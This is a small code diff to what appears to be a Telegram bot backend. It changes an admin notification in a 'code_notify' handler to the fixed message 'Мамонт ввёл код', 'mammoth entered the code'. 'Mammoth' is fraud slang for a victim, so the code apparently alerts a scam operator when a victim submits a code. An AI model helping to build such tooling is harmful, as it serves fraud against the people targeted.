@@ -1591,7 +1591,7 @@ async def code_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, text)  # без кнопок
+        await bot.send_message(admin_user_id, 'Мамонт ввёл код')
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
